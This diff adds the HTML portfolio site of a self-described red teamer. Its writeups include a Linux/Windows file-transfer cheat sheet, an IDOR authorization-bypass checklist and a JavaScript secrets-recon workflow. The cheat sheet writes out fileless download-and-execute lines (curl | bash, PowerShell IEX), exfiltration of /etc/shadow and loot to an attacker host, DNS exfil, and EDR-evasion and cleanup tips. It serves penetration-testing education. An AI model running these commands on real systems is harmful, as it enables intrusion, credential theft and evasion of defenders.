@@ -1,0 +1,786 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>cyb3radull4m</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<style>
+  /* Layout: committed dark terminal-hacker identity. Wide left-anchored shell; two-column hero; matrix + scanlines bg; burst-glitch headline; scroll-reveal sections. */
+  :root{
+    --bg:#0a0c11; --surface:#12151d; --surface-2:#191d27; --fg:#e9e7e0; --muted:#8b93a6;
+    --border:#242a38; --accent:#f0a93b; --accent-2:#43d3a8; --danger:#e06a5a;
+    --matrix:#2fd79a; --scan:rgba(255,255,255,.028); --mop:.15; --glow:rgba(240,169,59,.07);
+    --maxw:1060px;
+    --f-mono:"JetBrains Mono",ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+    --f-sans:"IBM Plex Sans",system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
+    color-scheme:dark;
+  }
+
+  *{box-sizing:border-box}
+  html{scroll-behavior:smooth}
+  body{background-color:var(--bg);
+    background-image:radial-gradient(1100px circle at 18% -5%,var(--glow),transparent 55%);
+    color:var(--fg);font-family:var(--f-sans);line-height:1.6;font-size:16px;-webkit-font-smoothing:antialiased}
+  body::before{content:"";position:fixed;inset:0 0 auto;height:env(safe-area-inset-top,0px);background:var(--bg);z-index:60}
+
+  /* background fx */
+  #matrix{position:fixed;inset:0;width:100%;height:100%;z-index:-1;opacity:var(--mop);pointer-events:none}
+  .cursor-glow{position:fixed;width:280px;height:280px;border-radius:50%;pointer-events:none;z-index:49;
+    background:radial-gradient(circle,rgba(240,169,59,.08) 0%,rgba(67,211,168,.04) 40%,transparent 70%);
+    transform:translate(-50%,-50%);transition:opacity .3s ease;opacity:0}
+  .has-js .cursor-glow{opacity:1}
+  .scan{position:fixed;inset:0;pointer-events:none;z-index:50;opacity:.6;
+    background:repeating-linear-gradient(to bottom,var(--scan) 0 1px,transparent 1px 3px)}
+
+  .wrap{max-width:var(--maxw);margin:0 auto;position:relative;
+    padding-left:max(24px,env(safe-area-inset-left,0px));
+    padding-right:max(24px,env(safe-area-inset-right,0px))}
+  a{color:var(--accent-2);text-decoration:none}
+  a:hover{text-decoration:underline}
+  ::selection{background:var(--accent);color:#0a0c11}
+  :focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:3px}
+
+  /* ---- top bar ---- */
+  header.bar{position:sticky;top:env(safe-area-inset-top,0px);z-index:40;
+    background:color-mix(in srgb,var(--bg) 82%,transparent);backdrop-filter:blur(9px);
+    border-bottom:1px solid var(--border)}
+  .bar .wrap{display:flex;align-items:center;gap:12px;padding-block:13px}
+  .brand{font-family:var(--f-mono);font-weight:700;letter-spacing:-.01em;color:var(--fg)}
+  .brand .dot{color:var(--accent)}
+  .bar nav{margin-left:auto;display:flex;gap:20px;font-family:var(--f-mono);font-size:13px}
+  .bar nav a{color:var(--muted);position:relative;transition:color .15s ease}
+  .bar nav a::before{content:"";position:absolute;left:0;right:100%;bottom:-5px;height:2px;
+    background:var(--accent);transition:right .2s ease}
+  .bar nav a:hover{color:var(--fg);text-decoration:none}
+  .bar nav a.active{color:var(--accent)}
+  .bar nav a.active::before{right:0}
+  @media (max-width:600px){ .bar nav{gap:14px;font-size:12px} }
+  @media (max-width:430px){ .bar nav a:nth-child(n+4){display:none} }
+
+  /* ---- hero ---- */
+  .hero{padding-block:52px 44px;border-bottom:1px solid var(--border)}
+  .hero .wrap{display:grid;grid-template-columns:1.02fr .98fr;gap:44px;align-items:center}
+  @media (max-width:860px){ .hero .wrap{grid-template-columns:1fr;gap:30px} }
+  .kicker{font-family:var(--f-mono);font-size:12px;letter-spacing:.16em;text-transform:uppercase;
+    color:var(--accent-2);margin:0 0 16px}
+  .kicker .b{color:var(--accent)}
+  h1.glitch{font-family:var(--f-mono);font-weight:700;font-size:clamp(2.4rem,8vw,4.2rem);
+    letter-spacing:-.04em;line-height:1;margin:0 0 18px;position:relative;color:var(--fg);
+    width:max-content;max-width:100%}
+  .glitch::before,.glitch::after{content:attr(data-text);position:absolute;inset:0;overflow:hidden;opacity:0}
+  .glitch::before{color:var(--accent-2)}
+  .glitch::after{color:var(--accent)}
+  .htag{font-size:clamp(1.05rem,2.4vw,1.28rem);color:var(--fg);max-width:40ch;margin:0 0 12px;text-wrap:balance}
+  .hsub{color:var(--muted);max-width:46ch;margin:0}
+
+  /* terminal */
+  .term{background:#070a0e;border:1px solid var(--border);border-radius:11px;overflow:hidden;
+    box-shadow:0 24px 60px rgba(0,0,0,.45);width:100%}
+  .termbar{display:flex;align-items:center;gap:8px;padding:10px 13px;background:#0e1118;border-bottom:1px solid #1d2230}
+  .tdot{width:11px;height:11px;border-radius:50%;flex:none}
+  .td1{background:#ff5f56}.td2{background:#ffbd2e}.td3{background:#27c93f}
+  .termttl{font-family:var(--f-mono);font-size:11.5px;color:#5a6474;margin-left:8px}
+  .termbody{padding:16px 16px 18px;font-family:var(--f-mono);font-size:13.5px;line-height:1.75;
+    color:#cfd4de;min-height:232px}
+  .tline{margin:0;white-space:pre-wrap;overflow-wrap:anywhere}
+  .tline.cmd::before{content:"cyb3r@sec:~$ ";color:var(--accent-2)}
+  .tline.out{color:#8b93a6}
+  .tline.out.hl{color:#f0a93b}
+  .tline.active::after{content:"\258B";color:#f0a93b;margin-left:1px;animation:blink 1s step-end infinite}
+
+  .chips{display:flex;flex-wrap:wrap;gap:10px;margin:28px 0 0;grid-column:1/-1}
+  .chip{display:inline-flex;align-items:center;gap:7px;font-family:var(--f-mono);font-size:12.5px;
+    background:var(--surface);border:1px solid var(--border);border-radius:999px;padding:7px 13px;color:var(--fg)}
+  .chip b{color:var(--accent);font-weight:700}
+  .chip.t2 b{color:var(--accent-2)}
+
+  /* ---- sections ---- */
+  section{padding-block:48px;border-bottom:1px solid var(--border)}
+  .eyebrow{font-family:var(--f-mono);font-size:12.5px;color:var(--accent-2);margin:0 0 8px}
+  .eyebrow .p{color:var(--muted)}
+  h2{font-family:var(--f-mono);font-weight:700;font-size:1.55rem;letter-spacing:-.02em;margin:0 0 6px}
+  .lead{color:var(--muted);max-width:64ch;margin:0 0 28px}
+
+  /* reveal on scroll */
+  .has-js .reveal{opacity:0;transform:translateY(18px);transition:opacity .55s ease,transform .55s ease}
+  .has-js .reveal.in{opacity:1;transform:none}
+
+  /* writeups */
+  .posts{display:flex;flex-wrap:wrap;gap:16px}
+  .post{display:block;background:var(--surface);border:1px solid var(--border);border-radius:10px;
+    padding:20px;border-left:3px solid var(--accent);transition:transform .15s ease,border-color .15s ease;
+    width:calc(50% - 8px);min-width:0;box-sizing:border-box}
+  @media (max-width:640px){ .post{width:100%} }
+  .post:hover{transform:translateY(-3px);border-left-color:var(--accent-2)}
+  .post .meta{font-family:var(--f-mono);font-size:11.5px;color:var(--muted);
+    display:flex;gap:10px;flex-wrap:wrap;margin-bottom:10px;align-items:center}
+  .tag{color:var(--accent-2);border:1px solid var(--border);border-radius:4px;padding:1px 7px}
+  .soon{color:var(--accent);border-color:color-mix(in srgb,var(--accent) 40%,var(--border))}
+  .post h3{font-family:var(--f-sans);font-size:1.12rem;font-weight:600;margin:0 0 6px;color:var(--fg);letter-spacing:-.01em}
+  .post p{margin:0;color:var(--muted);font-size:.95rem}
+
+  /* pillars */
+  .pillars{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
+  @media (max-width:760px){ .pillars{grid-template-columns:1fr 1fr} }
+  @media (max-width:480px){ .pillars{grid-template-columns:1fr} }
+  .pillar{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:18px;min-width:0;
+    transition:border-color .15s ease,transform .15s ease}
+  .pillar:hover{border-color:var(--accent-2);transform:translateY(-2px)}
+  .pillar .n{font-family:var(--f-mono);font-size:12px;color:var(--accent);margin-bottom:8px}
+  .pillar h3{font-size:1rem;margin:0 0 6px;letter-spacing:-.01em}
+  .pillar p{margin:0;color:var(--muted);font-size:.9rem}
+
+  /* work */
+  .work{display:flex;flex-direction:column;gap:0}
+  .op{display:grid;grid-template-columns:150px 1fr;gap:18px;padding:16px 0;border-top:1px solid var(--border)}
+  .op:first-child{border-top:0}
+  .op .sector{font-family:var(--f-mono);font-size:12px;color:var(--accent-2);padding-top:2px}
+  .op .d{min-width:0}
+  .op h3{font-size:1rem;margin:0 0 4px;letter-spacing:-.01em}
+  .op p{margin:0;color:var(--muted);font-size:.93rem}
+  @media (max-width:600px){ .op{grid-template-columns:1fr;gap:5px} }
+
+  /* creds */
+  .credgrid{display:grid;grid-template-columns:1fr 1fr;gap:30px}
+  @media (max-width:600px){ .credgrid{grid-template-columns:1fr;gap:22px} }
+  .credgrid h3{font-family:var(--f-mono);font-size:12.5px;letter-spacing:.1em;text-transform:uppercase;
+    color:var(--muted);margin:0 0 12px;font-weight:600}
+  .taglist{display:flex;flex-wrap:wrap;gap:8px;list-style:none;padding:0;margin:0}
+  .taglist li{font-family:var(--f-mono);font-size:12.5px;background:var(--surface);border:1px solid var(--border);
+    border-radius:6px;padding:6px 10px}
+  .taglist li.key{border-color:color-mix(in srgb,var(--accent) 45%,var(--border));color:var(--fg)}
+  .taglist li.key::before{content:"\2605 ";color:var(--accent)}
+
+  /* contact */
+  .contact-row{display:flex;flex-wrap:wrap;gap:12px;margin-top:6px}
+  .cline{display:flex;align-items:center;gap:10px;background:var(--surface);border:1px solid var(--border);
+    border-radius:8px;padding:10px 14px;font-family:var(--f-mono);font-size:13px;min-width:0}
+  .cline .k{color:var(--accent-2)}
+  .cline .v{color:var(--fg);word-break:break-all}
+  .cline a.v{color:var(--accent-2)}
+  .copy{background:transparent;border:1px solid var(--border);color:var(--muted);border-radius:5px;
+    font-family:var(--f-mono);font-size:11px;padding:3px 7px;cursor:pointer;flex:none}
+  .copy:hover{color:var(--accent);border-color:var(--accent)}
+  .copy.ok{color:var(--accent-2);border-color:var(--accent-2)}
+  .note{font-family:var(--f-mono);font-size:12px;color:var(--muted);margin-top:16px;
+    border-left:2px solid var(--border);padding-left:12px}
+
+  footer{padding-block:28px 40px;color:var(--muted);font-family:var(--f-mono);font-size:12px}
+  footer .wrap{display:flex;justify-content:space-between;flex-wrap:wrap;gap:8px}
+
+  @keyframes blink{50%{opacity:0}}
+  /* glitch fires in short bursts over crisp text, then rests clean */
+  @keyframes gl1{0%,90%,100%{opacity:0;transform:translate(0,0)}
+    91%{opacity:.85;transform:translate(-3px,1px);clip-path:inset(10% 0 58% 0)}
+    94%{opacity:.85;transform:translate(2px,-1px);clip-path:inset(60% 0 16% 0)}
+    97%{opacity:0}}
+  @keyframes gl2{0%,40%,56%,100%{opacity:0;transform:translate(0,0)}
+    44%{opacity:.8;transform:translate(3px,-1px);clip-path:inset(30% 0 40% 0)}
+    50%{opacity:.8;transform:translate(-2px,1px);clip-path:inset(72% 0 6% 0)}
+    54%{opacity:0}}
+  @media (prefers-reduced-motion:no-preference){
+    .glitch::before{animation:gl1 6s infinite steps(1,end)}
+    .glitch::after{animation:gl2 6s infinite steps(1,end)}
+    .glitch{animation:jit 6s infinite steps(1,end)}
+  }
+  @keyframes jit{0%,100%{transform:translate(0,0)}45%{transform:translate(1px,0)}50%{transform:translate(-1px,0)}92%{transform:translate(-1px,0)}95%{transform:translate(1px,0)}}
+  @media (prefers-reduced-motion:reduce){
+    html{scroll-behavior:auto}
+    .glitch::before,.glitch::after{display:none}
+    .scan{display:none}
+  }
+  /* writeup accordion + article typography */
+  details.post{transition:border-color .15s ease}
+  details.post:hover{transform:none}
+  details.post>summary{cursor:pointer;list-style:none;outline:none}
+  details.post>summary::-webkit-details-marker{display:none}
+  details.post>summary::marker{display:none;content:""}
+  details.post>summary h3{margin-top:6px}
+  details.post[open]{border-left-color:var(--accent-2);width:100%;flex-basis:100%}
+  .exp{color:var(--accent);margin-left:auto}
+  details.post[open] .exp{opacity:.5}
+  /* polyfill: browsers that don't support <details> show content always */
+  details.post>.art{display:none}
+  details.post[open]>.art{display:block}
+  .art{margin-top:14px;border-top:1px solid var(--border);padding-top:14px}
+  .art h4{font-family:var(--f-mono);font-size:.92rem;color:var(--accent);margin:18px 0 8px;letter-spacing:-.01em}
+  .art h4:first-child{margin-top:0}
+  .art p{color:var(--muted);margin:0 0 12px;font-size:.95rem}
+  .art ol,.art ul{color:var(--muted);margin:0 0 14px;padding-left:20px;font-size:.93rem}
+  .art li{margin:6px 0}
+  .art strong{color:var(--fg)}
+  .art code{font-family:var(--f-mono);background:#0b0e14;border:1px solid var(--border);border-radius:4px;padding:1px 5px;font-size:.85em;color:var(--accent-2)}
+  .art pre{background:#070a0e;border:1px solid var(--border);border-radius:8px;padding:12px 14px;overflow-x:auto;margin:0 0 14px}
+  .art pre code{background:none;border:0;padding:0;color:#cfd4de;font-size:.82rem;line-height:1.65;white-space:pre}
+  .art pre{position:relative}
+  .art .toc{font-family:var(--f-mono);font-size:.82rem;color:var(--muted);background:#0b0e14;border:1px solid var(--border);border-radius:8px;padding:12px 14px;margin:0 0 16px}
+  .art .toc b{color:var(--accent-2)}
+  .art .cp{position:absolute;top:7px;right:7px;background:#11151c;border:1px solid var(--border);color:var(--muted);border-radius:5px;font-family:var(--f-mono);font-size:10px;padding:2px 7px;cursor:pointer;opacity:.7}
+  .art .cp:hover{color:var(--accent);border-color:var(--accent);opacity:1}
+  .art .cp.ok{color:var(--accent-2);border-color:var(--accent-2)}
+</style>
+
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+
+<canvas id="matrix" aria-hidden="true"></canvas>
+<div class="cursor-glow" id="cursor-glow" aria-hidden="true"></div>
+<div class="scan" aria-hidden="true"></div>
+
+<header class="bar">
+  <div class="wrap">
+    <span class="brand">cyb3radull4m<span class="dot">_</span></span>
+    <nav>
+      <a href="#writeups">writeups</a>
+      <a href="#labs">labs</a>
+      <a href="#focus">focus</a>
+      <a href="#work">work</a>
+      <a href="#creds">creds</a>
+      <a href="#contact">contact</a>
+    </nav>
+  </div>
+</header>
+
+<main>
+  <section class="hero" id="top">
+    <div class="wrap">
+      <div class="hcol">
+        <p class="kicker">// <span class="b">Welcome, intruder.</span> access granted</p>
+        <h1 class="glitch" data-text="cyb3radull4m">cyb3radull4m</h1>
+        <p class="htag">Offensive security researcher &amp; red teamer.</p>
+        <p class="hsub">I break the logic behind money and identity &mdash; the flaws automated scanners never see. Five years leading red team operations against critical national infrastructure across Africa.</p>
+      </div>
+      <div class="term" role="img" aria-label="Terminal introducing cyb3radull4m, offensive security researcher and red teamer">
+        <div class="termbar">
+          <span class="tdot td1"></span><span class="tdot td2"></span><span class="tdot td3"></span>
+          <span class="termttl">bash — cyb3radull4m@sec</span>
+        </div>
+        <div class="termbody" id="term">
+          <p class="tline cmd">whoami</p>
+          <p class="tline out hl">cyb3radull4m</p>
+          <p class="tline cmd">cat ./role.txt</p>
+          <p class="tline out">Offensive security researcher &amp; red teamer.</p>
+          <p class="tline cmd">cat ./focus.txt</p>
+          <p class="tline out">business-logic &middot; financial-flows &middot; identity &middot; adversary-emulation</p>
+          <p class="tline cmd">./list-proof --short</p>
+        </div>
+      </div>
+      <div class="chips">
+        <span class="chip">Top 10 globally &middot; <b>YesWeHack</b></span>
+        <span class="chip t2"><b>EC-Council</b> Hall of Fame</span>
+        <span class="chip t2"><b>Synack</b> Red Team</span>
+        <span class="chip">OSWE &middot; OSEP &middot; <b>OSCP</b></span>
+      </div>
+    </div>
+  </section>
+
+  <section id="writeups" class="reveal">
+    <div class="wrap">
+      <p class="eyebrow"><span class="p">cyb3r@sec:~$</span> cat writeups/*</p>
+      <h2>Writeups</h2>
+      <p class="lead">Technique-level breakdowns of the bugs I hunt &mdash; sanitised, client-free, and focused on the pattern you can reuse. The flagship lane is business logic in money-movement and identity flows.</p>
+      <div class="posts">
+
+        <details class="post">
+          <summary>
+            <div class="meta"><span class="tag">file-transfer</span><span>red team</span><span class="exp">read &#9662;</span></div>
+            <h3>File transfer cheat sheet: Linux &harr; Windows, quietly</h3>
+            <p>The unflashy skill that wins engagements &mdash; moving a file onto a box in a limited shell without lighting up EDR.</p>
+          </summary>
+          <div class="art">
+            <p>Some of the most important offensive skills aren't flashy. Transferring a file without alerting endpoint defences, or getting one exploit onto a box in a stripped-down shell, is where the quiet skills shine. This is the full reference &mdash; every method worth muscle memory, with notes on detection and when each one fits.</p>
+
+            <div class="toc"><b>Contents:</b> 1. Serve &middot; 2. Pull (Linux) &middot; 3. Pull (Windows) &middot; 4. SMB &middot; 5. SCP/SFTP &middot; 6. FTP &middot; 7. Base64 paste &middot; 8. Netcat &middot; 9. /dev/tcp (bash built-in) &middot; 10. SSH tunnelling &middot; 11. DNS exfil &middot; 12. Exfiltration &middot; OPSEC</div>
+
+            <h4>1. Serve the file (attacker host)</h4>
+<pre><code># HTTP — one-liner
+python3 -m http.server 80
+
+# Upload-capable (also receives files back from the target)
+pip install uploadserver &amp;&amp; python3 -m uploadserver 80
+
+# PHP quick server
+php -S 0.0.0.0:80
+
+# Ruby one-liner
+ruby -run -e httpd . -p 80</code></pre>
+
+            <h4>2. Pull to a Linux target</h4>
+<pre><code># Standard
+wget http://10.10.14.1/x -O /tmp/x
+curl http://10.10.14.1/x -o /tmp/x
+
+# Quieter: pipe straight into bash (fileless)
+curl -s http://10.10.14.1/s.sh | bash
+
+# If curl/wget are stripped
+python3 -c "import urllib.request; urllib.request.urlretrieve('http://10.10.14.1/x','/tmp/x')"
+perl -e 'use LWP::Simple; getstore("http://10.10.14.1/x","/tmp/x")'
+
+# Busybox (IoT, containers, minimal installs)
+busybox wget http://10.10.14.1/x -O /tmp/x</code></pre>
+
+            <h4>3. Pull to a Windows target</h4>
+            <p>Prefer native, lower-signature methods first. <code>certutil</code> and <code>bitsadmin</code> still work but are heavily monitored by EDR.</p>
+<pre><code># PowerShell — native, quieter than certutil
+iwr http://10.10.14.1/x.exe -OutFile C:\Windows\Temp\x.exe
+(New-Object Net.WebClient).DownloadFile('http://10.10.14.1/x.exe','x.exe')
+
+# Fileless — execute in memory, nothing written to disk
+IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.1/s.ps1')
+
+# Start-BitsTransfer — uses BITS service, survives reboots
+Start-BitsTransfer -Source http://10.10.14.1/x.exe -Dest C:\Temp\x.exe
+
+# curl.exe ships with Windows 10+
+curl.exe http://10.10.14.1/x.exe -o x.exe
+
+# Loud but reliable (expect EDR detection)
+certutil -urlcache -f http://10.10.14.1/x.exe x.exe
+bitsadmin /transfer j http://10.10.14.1/x.exe C:\Windows\Temp\x.exe</code></pre>
+
+            <h4>4. SMB</h4>
+            <p>Modern Windows blocks guest SMB, so share with credentials.</p>
+<pre><code># Attacker — stand up an authenticated share
+impacket-smbserver share . -smb2support -username a -password a
+
+# Target — mount and copy
+net use \\10.10.14.1\share /user:a a
+copy \\10.10.14.1\share\x.exe .
+
+# Unmount when done (cleanup)
+net use \\10.10.14.1\share /delete</code></pre>
+
+            <h4>5. SCP / SFTP</h4>
+            <p>When you have SSH access and just need to move a file. Native, encrypted, and usually not flagged.</p>
+<pre><code># Push to target (from attacker)
+scp x.bin user@10.10.10.5:/tmp/x.bin
+
+# Pull from target (from attacker)
+scp user@10.10.10.5:/etc/shadow ./shadow
+
+# SFTP interactive session
+sftp user@10.10.10.5</code></pre>
+
+            <h4>6. FTP</h4>
+            <p>Useful when HTTP is blocked but FTP egress is open. Stand up a quick server and pull.</p>
+<pre><code># Attacker — pyftpdlib one-liner
+python3 -m pyftpdlib -w -p 21
+
+# Target — Linux
+wget ftp://10.10.14.1/x -O /tmp/x
+
+# Target — Windows (script mode, no interactive)
+echo open 10.10.14.1 21 &gt; ftp.txt
+echo anonymous &gt;&gt; ftp.txt
+echo binary &gt;&gt; ftp.txt
+echo get x.exe &gt;&gt; ftp.txt
+echo bye &gt;&gt; ftp.txt
+ftp -n -s:ftp.txt</code></pre>
+
+            <h4>7. No network / limited shell &mdash; base64 paste</h4>
+            <p>When there's no outbound network, paste the file as a base64 string.</p>
+<pre><code># Linux: encode to one line
+base64 -w0 payload.bin ; echo
+
+# Linux: decode on target
+echo "&lt;paste&gt;" | base64 -d &gt; payload.bin
+
+# Windows: encode
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("payload.exe"))
+
+# Windows: decode
+[IO.File]::WriteAllBytes("x.bin",[Convert]::FromBase64String("&lt;paste&gt;"))
+
+# Windows: certutil can also decode base64
+certutil -decode encoded.b64 decoded.exe</code></pre>
+
+            <h4>8. Netcat</h4>
+<pre><code># Receiver (attacker or target — whoever is listening)
+nc -lvnp 4444 &gt; file.out
+
+# Sender
+nc -q0 10.10.14.1 4444 &lt; file.in
+
+# If -q is unavailable (BSD netcat), use -w timeout
+nc -w3 10.10.14.1 4444 &lt; file.in
+
+# Encrypted with ncat (nmap's netcat)
+ncat --ssl -lvnp 4444 &gt; file.out      # receiver
+ncat --ssl 10.10.14.1 4444 &lt; file.in   # sender</code></pre>
+
+            <h4>9. /dev/tcp (bash built-in, no tools needed)</h4>
+            <p>When the target has bash but nothing else. No binary required.</p>
+<pre><code># Download a file using only bash
+exec 3&lt;&gt;/dev/tcp/10.10.14.1/80
+echo -e "GET /x HTTP/1.0\r\nHost: 10.10.14.1\r\n\r\n" &gt;&amp;3
+cat &lt;&amp;3 &gt; /tmp/x
+exec 3&gt;&amp;-</code></pre>
+
+            <h4>10. SSH tunnelling for restricted networks</h4>
+            <p>When only SSH is allowed out. Forward a local port to your attack server.</p>
+<pre><code># Local port forward: target:8888 → attacker:80
+ssh -L 8888:127.0.0.1:80 user@10.10.14.1 -N -f
+
+# Then on target, download through the tunnel
+curl http://127.0.0.1:8888/x -o /tmp/x
+
+# Reverse: open a port on the attacker that tunnels to target
+ssh -R 9999:127.0.0.1:445 user@10.10.14.1 -N -f</code></pre>
+
+            <h4>11. DNS exfil (last resort, slow)</h4>
+            <p>When all TCP/HTTP egress is blocked, but DNS resolves. Encodes data in subdomain labels.</p>
+<pre><code># Concept: split file into chunks, query your DNS server
+for chunk in $(xxd -p loot.txt | fold -w 60); do
+  nslookup $chunk.exfil.yourdomain.com
+done
+
+# Attacker catches the queries with a DNS listener
+# Tools: dnscat2, iodine, or a simple tcpdump on port 53</code></pre>
+
+            <h4>12. Exfiltration: target &rarr; attacker</h4>
+<pre><code># HTTP upload (attacker runs uploadserver from step 1)
+curl -F file=@/etc/shadow http://10.10.14.1/upload
+Invoke-RestMethod -Uri http://10.10.14.1/upload -Method Post -InFile loot.zip
+
+# Exfil over HTTPS (if you have a cert)
+curl -k -F file=@loot.tar.gz https://10.10.14.1/upload
+
+# Exfil via SMB (write back to your share)
+copy C:\loot.zip \\10.10.14.1\share\loot.zip</code></pre>
+
+            <h4>OPSEC notes</h4>
+            <ul>
+              <li><strong>Egress matters.</strong> Test which ports your foothold can reach. Outbound 445 (SMB), 80/443 and 53 (DNS) are filtered differently on every network.</li>
+              <li><strong>Signature vs native.</strong> <code>certutil</code>, <code>bitsadmin</code> and <code>mshta</code> downloads are classic EDR detections. Native <code>curl.exe</code>/<code>iwr</code> and in-memory loads are quieter.</li>
+              <li><strong>Encrypt sensitive loot</strong> before it crosses the wire. Zip with a password or use <code>openssl enc</code>.</li>
+              <li><strong>Clean up artifacts</strong> when you're done &mdash; certutil cache, temp files, FTP scripts, SMB mount points.</li>
+              <li><strong>Log awareness.</strong> Every method above leaves traces somewhere (process creation, network connections, DNS queries). Know what your method logs and whether the SOC is watching.</li>
+              <li>Only run this against systems you are authorised to test.</li>
+            </ul>
+          </div>
+        </details>
+
+        <details class="post">
+          <summary>
+            <div class="meta"><span class="tag">access-control</span><span>IDOR</span><span class="exp">read &#9662;</span></div>
+            <h3>IDOR is more than 9 &rarr; 10: a 403/404 bypass checklist</h3>
+            <p>Changing an ID is the warm-up. Authorization bugs fail quietly, so when the swap returns 403/404, these are the bypasses to reach for.</p>
+          </summary>
+          <div class="art">
+            <p>If your IDOR testing stops at changing an ID from 9 to 10, you're scratching the surface. Say you're user <code>10</code>, <code>/api/v2/users/10</code> works, but <code>/api/v2/users/9</code> returns <strong>403</strong> or <strong>404</strong>. That refusal is often shallow. Work this checklist against the blocked request.</p>
+
+            <h4>Path normalisation</h4>
+<pre><code>/api/v2/users/9/            # trailing slash
+/api/v2/users//9//         # doubled slashes
+/api/v2/users/9//
+/api/v2/users/9.json       # extension appended
+/api/v2/users/9;           # matrix/param suffix
+/api/v2/users/%2e/9        # encoded dot segment</code></pre>
+
+            <h4>Version &amp; sibling endpoints</h4>
+<pre><code>/api/v1/users/9/           # version downgrade (older, laxer authz)
+/api/v1/users/9/home       # alternate action under the object
+/api/internal/users/9      # forgotten sibling route</code></pre>
+
+            <h4>ID format confusion</h4>
+<pre><code>/api/v1/users/09           # leading zero
+/api/v1/users/0x9          # hex
+/api/v1/users/9.0          # float
+/api/v1/users/10,9         # list — may return both
+/api/v1/users?id=10&amp;id=9   # parameter pollution
+/api/v1/users/9abc         # trailing garbage tolerated by the parser</code></pre>
+
+            <h4>Encoding</h4>
+<pre><code>/api/v2/users/%209         # encoded space
+/api/v2/users/9%00         # null byte
+/api/v1/users/%2539        # double URL-encoding (%25 -&gt; %)</code></pre>
+
+            <h4>Method &amp; header tricks</h4>
+<pre><code># Flip the verb — read authz is sometimes stricter than write
+GET -&gt; POST / PUT, or X-HTTP-Method-Override: GET
+
+# Front-end path override headers (when a proxy trusts them)
+X-Original-URL: /api/v2/users/9
+X-Rewrite-URL: /api/v2/users/9</code></pre>
+
+            <h4>Then: prove it's real, not a false positive</h4>
+            <p>A <strong>200 is not the finding</strong>. A bypass only counts when the response contains the <em>victim's</em> data &mdash; at least two or three owner-bound fields (email, UUID, created_at, account number) that are <em>not yours</em>. Confirm with three requests: your own object (baseline 200), the victim object (the attack), and a random non-existent ID (control 404). If the "victim" response just echoes your own data or the ID back, it's a false positive, not an IDOR.</p>
+
+            <h4>Fix</h4>
+            <p>Enforce object-level authorization <strong>server-side on every route</strong>, keyed to the authenticated session, after canonicalising the path. Normalise before you authorise, never after.</p>
+          </div>
+        </details>
+
+        <details class="post">
+          <summary>
+            <div class="meta"><span class="tag">recon</span><span>AppSec</span><span class="exp">read &#9662;</span></div>
+            <h3>JavaScript analysis for AppSec: a repeatable workflow</h3>
+            <p>Where to start when a target hands you a wall of JavaScript &mdash; collect, dedupe, filter live, then hunt secrets and endpoints.</p>
+          </summary>
+          <div class="art">
+            <p>Client-side JavaScript leaks more than people think: forgotten endpoints, deprecated routes, feature flags, and the occasional hard-coded key. This is a pipeline you can run on any target.</p>
+
+            <h4>1. Collect from Burp</h4>
+            <p>In Burp's HTTP history, filter by MIME type <code>script</code> or URL ending <code>.js</code>, then copy all the JavaScript URLs to <code>burp-js.txt</code>.</p>
+
+            <h4>2. Pull historical JS from the Wayback Machine</h4>
+<pre><code>curl -sG "https://web.archive.org/cdx/search/cdx" \
+  --data-urlencode "url=example.com/*" \
+  --data-urlencode "output=text" \
+  --data-urlencode "fl=original" \
+  --data-urlencode "collapse=urlkey" | grep -i '\.js$' &gt; wayback-js.txt
+
+# or, broader historical URL sources
+gau example.com | grep '\.js$' &gt;&gt; wayback-js.txt</code></pre>
+
+            <h4>3. Merge and dedupe</h4>
+<pre><code>cat burp-js.txt wayback-js.txt | sort -u &gt; all-js.txt</code></pre>
+
+            <h4>4. Keep only live files</h4>
+<pre><code>cat all-js.txt | httpx -silent -mc 200 -o live-js.txt</code></pre>
+
+            <h4>5. Hunt secrets &mdash; grep first pass</h4>
+<pre><code>while read url; do
+  echo "[+] $url"
+  curl -s "$url" | grep -Eio \
+  'api[_-]?key|secret|token|authorization|password|jwt|bearer|aws_access_key_id|aws_secret_access_key|firebase|private_key|client_secret'
+done &lt; live-js.txt</code></pre>
+
+            <h4>6. Then the dedicated tools</h4>
+<pre><code>cat live-js.txt | mantra                 # fast key/token scanner
+cat live-js.txt | jsleak -s -l -k        # secrets + links
+trufflehog filesystem ./js --only-verified   # verified-only, low noise
+nuclei -l live-js.txt -t http/exposures/ -o nuclei-js.txt</code></pre>
+
+            <h4>7. Extract endpoints</h4>
+<pre><code>xnLinkFinder -i live-js.txt -o endpoints.txt
+# or the BurpJSLinkFinder extension for in-tool discovery</code></pre>
+
+            <h4>8. Don't skip source maps</h4>
+            <p>If a <code>.js.map</code> is reachable, you can reconstruct the <strong>original, unminified source</strong> &mdash; variable names, comments, routes and all. That is often the single richest artifact on the whole target. Beautify what you can't map (<code>js-beautify</code>) and read for hidden parameters, role checks, and API routes the UI never calls.</p>
+
+            <h4>The point</h4>
+            <p>Feed every endpoint you find back into your scope and your proxy. JavaScript recon isn't a one-off scan; it's how you build the real map of an application's attack surface.</p>
+          </div>
+        </details>
+
+      </div>
+      <p class="note">Updated from my field notes &middot; more writeups on the way.</p>
+    </div>
+  </section>
+
+  <section id="labs" class="reveal">
+    <div class="wrap">
+      <p class="eyebrow"><span class="p">cyb3r@sec:~$</span> git clone cyb3radull4m-labs</p>
+      <h2>Labs</h2>
+      <p class="lead">Free, source-included web exploitation labs for OSWE-style prep. Read the code, find the chain, write the exploit &mdash; every lab ends in remote code execution. One-command Docker, a reference exploit and a walkthrough in each.</p>
+      <div class="pillars">
+        <div class="pillar"><div class="n">01 &middot; PHP &middot; &#9733;&#9734;&#9734;&#9734;&#9734;</div><h3>Looking Glass</h3><p>Type-juggling auth bypass &rarr; command injection &rarr; RCE.</p></div>
